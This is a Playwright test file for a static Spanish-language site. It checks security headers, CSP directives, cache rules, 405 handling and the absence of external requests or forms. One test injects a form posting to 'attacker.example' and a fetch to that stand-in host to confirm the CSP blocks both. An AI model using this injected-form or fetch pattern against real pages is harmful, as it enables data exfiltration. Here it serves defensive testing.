import { test, expect } from "@playwright/test";

// PA-11 — Cabeceras, CSP, caché y red limpia sobre el compilado
// (PA-Q028, PA-Q031, PA-Q032, PA-Q033, PA-Q034, PA-Q035, PA-Q036, PA-Q037, PA-Q038).
// ---------------------------------------------------------------------
// Se ejercita `scripts/serve-dist.mjs` (emulación estática con CSP por
// hashes concretos + caché + 405). LIMITACIÓN: el CDN real gestiona sus
// propias cabeceras; el smoke sobre destino se repite en PA-17+.

const LOCAL = [/^http:\/\/127\.0\.0\.1/, /^http:\/\/localhost/];
const isLocal = (url: string): boolean => LOCAL.some((re) => re.test(url));

function expectCspBase(csp: string): void {
  for (const directiva of [
    "default-src 'self'",
    "object-src 'none'",
    "base-uri 'self'",
    "frame-ancestors 'none'",
    "form-action 'none'",
    "connect-src 'none'",
    "img-src 'self'",
    "font-src 'self'",
    "script-src 'self'",
    "style-src 'self'",
  ]) {
    expect(csp).toContain(directiva);
  }
  expect(csp).not.toContain("unsafe-inline");
  expect(csp).not.toContain("unsafe-eval");
  // El inline del Header entra por hash concreto, no por apertura amplia.
  expect(csp).toMatch(/script-src 'self' 'sha256-[A-Za-z0-9+/=]+'/);
}

test.describe("PA-11 · Cabeceras de seguridad y caché", () => {
  test("HTML sirve CSP base + nosniff + referrer + permissions", async ({ page }) => {
    for (const ruta of ["/", "/ruta-que-no-existe-xyz/"]) {
      const res = await page.request.get(ruta);
      expect(res.status()).toBe(ruta.startsWith("/ruta-") ? 404 : 200);
      const h = res.headers();
      expectCspBase(h["content-security-policy"] ?? "");
      expect(h["x-content-type-options"]).toBe("nosniff");
      expect(h["referrer-policy"]).toBe("strict-origin-when-cross-origin");
      expect(h["permissions-policy"] ?? "").toContain("geolocation=()");
      expect(h["permissions-policy"] ?? "").toContain("camera=()");
      expect(h["permissions-policy"] ?? "").toContain("microphone=()");
    }
  });

  test("caché: HTML revalida, assets con hash son inmutables", async ({ page }) => {
    const html = await page.request.get("/");
    expect(html.headers()["cache-control"]).toBe("no-cache");

    await page.goto("/");
    const cssHref =
      (await page.locator('link[rel="stylesheet"]').first().getAttribute("href")) ?? "";
    expect(cssHref).toMatch(/^\/_astro\//);
    const css = await page.request.get(cssHref);
    expect(css.status()).toBe(200);
    expect(css.headers()["cache-control"]).toBe("public, max-age=31536000, immutable");

    const notFound = await page.request.get("/ruta-que-no-existe-xyz/");
    expect(notFound.headers()["cache-control"]).toBe("no-store");
  });

  test("método no admitido → 405 con Allow; ruta de recepción antigua → 404", async ({ page }) => {
    const post = await page.request.post("/");
    expect(post.status()).toBe(405);
    expect(post.headers()["allow"]).toContain("GET");

    const put = await page.request.put("/");
    expect(put.status()).toBe(405);

    // PA-Q034: nunca registro ni confirmación con 200.
    const vieja = await page.request.get("/api/contacto");
    expect(vieja.status()).toBe(404);
    const postVieja = await page.request.post("/api/contacto");
    expect([404, 405]).toContain(postVieja.status());
  });
});

test.describe("PA-11 · CSP efectiva sin violaciones (Chromium)", () => {
  test("navegación + interacción sin errores de CSP; el inline autorizado ejecuta", async ({
    page,
  }) => {
    const violaciones: string[] = [];
    page.on("console", (msg) => {
      if (msg.type() === "error") violaciones.push(msg.text());
    });
    page.on("pageerror", (err) => violaciones.push(String(err)));

    await page.goto("/");
    await page.goto("/ruta-que-no-existe-xyz/");
    await page.goto("/");

    // El script inline del Header (menú móvil) ejecuta bajo el hash:
    // aria-expanded se sincroniza al abrir/cerrar.
    await page.setViewportSize({ width: 390, height: 844 });
    const summary = page.locator(".site-header__toggle");
    await expect(summary).toBeVisible();
    await summary.click();
    await expect(summary).toHaveAttribute("aria-expanded", "true");
    await page.keyboard.press("Escape");
    await expect(summary).toHaveAttribute("aria-expanded", "false");

    // Interacción de cobertura (script local diferido, 'self').
    await page.setViewportSize({ width: 1440, height: 900 });
    const selector = page.locator("[data-cobertura-selector]");
    if ((await selector.count()) > 0) {
      await selector.selectOption("bogota");
      await expect(page.locator("#cobertura-ciudad-bogota")).toHaveClass(
        /cobertura__ciudad--activa/,
      );
    }

    const csp = violaciones.filter((m) => /content security policy|violates|CSP/i.test(m));
    expect(csp).toEqual([]);
  });
});

test.describe("PA-11 · Red y storage limpios (PA-Q031, PA-Q032, PA-Q033)", () => {
  test("sólo recursos locales; sin fetch/XHR/beacon/WebSocket de aplicación", async ({ page }) => {
    const externas: string[] = [];
    const dinamicas: string[] = [];
    let websockets = 0;
    page.on("request", (req) => {
      if (!isLocal(req.url())) externas.push(req.url());
      if (["fetch", "xmlhttprequest"].includes(req.resourceType())) {
        dinamicas.push(`${req.resourceType()} ${req.url()}`);
      }
    });
    page.on("websocket", () => {
      websockets++;
    });

    await page.goto("/");
    await page.locator("header a[href='#cobertura']").first().click();
    const selector = page.locator("[data-cobertura-selector]");
    if ((await selector.count()) > 0) {
      await selector.selectOption("cali");
    }
    await page.goto("/ruta-que-no-existe-xyz/");

    expect(externas).toEqual([]);
    expect(dinamicas).toEqual([]);
    expect(websockets).toBe(0);
  });

  test("sin persistencia propia ni service worker en perfil limpio", async ({ page }) => {
    await page.goto("/");
    const estado = await page.evaluate(async () => ({
      ls: window.localStorage.length,
      ss: window.sessionStorage.length,
      cookie: document.cookie,
      sw:
        "serviceWorker" in navigator
          ? (await navigator.serviceWorker.getRegistrations()).length
          : -1,
      controller: "serviceWorker" in navigator ? navigator.serviceWorker.controller : null,
    }));
    expect(estado.ls).toBe(0);
    expect(estado.ss).toBe(0);
    expect(estado.cookie).toBe("");
    expect(estado.sw).toBe(0);
    expect(estado.controller).toBeNull();
  });
});

test.describe("PA-11 · Sin captación en el DOM (PA-Q028)", () => {
  test("sin form/input/textarea/submit en portada y 404", async ({ page }) => {
    for (const ruta of ["/", "/ruta-que-no-existe-xyz/"]) {
      await page.goto(ruta);
      expect(await page.locator("form").count()).toBe(0);
      expect(await page.locator("input").count()).toBe(0);
      expect(await page.locator("textarea").count()).toBe(0);
      expect(await page.locator('[type="submit"]').count()).toBe(0);
      expect(await page.locator("iframe").count()).toBe(0);
    }
  });
});

test.describe("PA-11 · Bloqueo real de form-action y connect-src (PA-Q036, PA-Q037)", () => {
  test("form a origen externo y fetch externo se bloquean por CSP", async ({ page }) => {
    const erroresConsola: string[] = [];
    page.on("console", (msg) => {
      if (msg.type() === "error") erroresConsola.push(msg.text());
    });

    await page.goto("/");
    const urlAntes = page.url();

    const resultado = await page.evaluate(async () => {
      const violaciones: string[] = [];
      const oyente = (e: Event): void => {
        const v = e as SecurityPolicyViolationEvent;
        violaciones.push(`${v.violatedDirective} ← ${v.blockedURI}`);
      };
      document.addEventListener("securitypolicyviolation", oyente);

      // 1) Formulario inyectado hacia origen externo (dominio reservado,
      //    sin red real): el envío debe bloquearse y la página no navega.
      const form = document.createElement("form");
      form.action = "https://attacker.example/recibir";
      form.method = "POST";
      const campo = document.createElement("input");
      campo.name = "q";
      campo.value = "x";
      form.appendChild(campo);
      const boton = document.createElement("button");
      boton.type = "submit";
      boton.textContent = "enviar";
      form.appendChild(boton);
      document.body.appendChild(form);
      boton.click();
      await new Promise((r) => setTimeout(r, 800));

      // 2) fetch a origen externo: debe rechazar por connect-src.
      let fetchEstado = "no-intentado";
      try {
        await fetch("https://attacker.example/ping");
        fetchEstado = "resuelto-INESPERADO";
      } catch (err) {
        fetchEstado = `rechazado:${err instanceof Error ? err.message : String(err)}`;
      }
      await new Promise((r) => setTimeout(r, 800));
      document.removeEventListener("securitypolicyviolation", oyente);
      form.remove();
      return { violaciones, fetchEstado, url: location.href };
    });

    // El envío no navegó fuera: la página sigue siendo la local.
    expect(page.url()).toBe(urlAntes);
    expect(resultado.url).toBe(new URL(urlAntes).href.split("#")[0] ?? resultado.url);

    // El fetch externo fue bloqueado (rechazado, nunca 200).
    expect(resultado.fetchEstado.startsWith("rechazado:")).toBe(true);

    // Las violaciones observadas nombran las directivas que bloquean.
    const todo = [...resultado.violaciones, ...erroresConsola].join("\n");
    expect(todo).toMatch(/form-action/);
    expect(todo).toMatch(/connect-src/);
  });
});

test.describe("PA-11 · Sin JS sigue funcionando", () => {
  test.use({ javaScriptEnabled: false });

  test("contenido, cobertura textual y contacto visibles sin JS", async ({ page }) => {
    await page.goto("/");
    await expect(page.locator("#ventajas")).toBeVisible();
    // La lista textual de cobertura es la fuente de verdad (13 ciudades).
    expect(await page.locator("[data-city-id].cobertura__ciudad").count()).toBe(13);
    // El menú nativo <details>/<summary> existe y es operable sin JS.
    expect(await page.locator(".site-header__toggle").count()).toBe(1);
    // El correo directo sigue disponible sin JS.
    await expect(page.locator("#contacto a[href^='mailto:']")).toHaveCount(1);
  });
});
